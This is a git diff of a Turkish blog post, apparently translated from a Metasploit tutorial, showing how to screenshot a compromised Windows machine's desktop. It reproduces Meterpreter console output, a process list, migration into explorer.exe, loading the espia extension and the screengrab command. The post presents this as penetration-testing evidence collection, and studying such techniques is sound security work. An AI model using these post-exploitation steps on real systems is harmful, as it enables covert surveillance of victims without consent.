@@ -5,7 +5,7 @@ date: 2017-05-25 09:10:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,17 +13,20 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework client exploit
-- msf client side exploit
-excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
-  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
-  da içerisine zararlı kodlar gömülebilir.
+- Metasploit Framework screengrab
+- msf meterpreter screengrab
+excerpt: Meterpreter shell oturumunun sağladığı imkanlardan bir tanesi de hedef bilgisayarın Masaüstü görüntüsünü kaydedebilmektir. Bu yöntemle Masaüstü görüntüsü alma, genellikle pentest işlemlerinde ispat olarak kullanılır.
 ---
 
-Screen Capturing in Metasploit
+# Ekran Yakalama
 
-Another feature of meterpreter is the ability to capture the victims desktop and save them on your system. Let’s take a quick look at how this works. We’ll already assume you have a meterpreter console, we’ll take a look at what is on the victims screen.
+Meterpreter shell oturumunun sağladığı imkanlardan bir tanesi de hedef bilgisayarın Masaüstü görüntüsünü kaydedebilmektir. Bu yöntemle Masaüstü görüntüsü alma, genellikle pentest işlemlerinde ispat olarak kullanılır.
 
+Meterpreter oturum açtığınızda, oturumu ```explorer.exe``` prosesine taşınmalısınız. Aşağıdaki örnekte öncelikle sistemde çalışan programlar kontrol edilmektedir. 
+
+Hedef bilgisayarda meterpreter oturum açtığınızı farz ediyoruz. Öncelikle çalışan işlemlere bakalım. Bunun için ```ps``` komutunu kullanabilirsiniz.
+
+```sh
 [*] Started bind handler
 [*] Trying target Windows XP SP2 - English...
 [*] Sending stage (719360 bytes)
@@ -67,13 +70,28 @@ Process list
     2188  swatch.exe           c:\surgemail\swatch.exe
     2444  iexplore.exe         C:\Program Files\Internet Explorer\iexplore.exe
     3004  cmd.exe              C:\WINDOWS\system32\cmd.exe
+```
+Örnek çıktıda görüldüğü gibi ```explorer.exe``` 260 PID numarasıyla çalışmaktadır. ```migrate``` komutuyla Meterpreter oturumunu ```explorer.exe``` içine taşıyalım.
 
+```sh
 meterpreter > migrate 260
 [*] Migrating to 260...
 [*] Migration completed successfully.
+```
+
+Ardından ```espia``` eklentisini aktif hale getirelim.
+
+```sh
 meterpreter > use espia
 Loading extension espia...success.
+```
+
+```screengrab``` komutuyla hedef bilgisayarın Masaüstü görüntüsünü kaydedelim.
+
+```sh
 meterpreter > screengrab
 Screenshot saved to: /root/nYdRUppb.jpeg
 meterpreter >
-We can see how effective this was in migrating to the explorer.exe, be sure that the process your meterpreter is on has access to active desktops or this will not work.
+```
+
+Gördüğünüz gibi Masaüstü resmi yerel bilgisayarımıza kaydedildi. Bu işlemi yaparken ```explorer.exe``` veya benzeri şekilde klasör ve dosyalar üzerinde işlem yapabilen bir programa geçiş yapmanız önemlidir. Aksi takdirde ```screengrab``` komutu çalışmayabilir.
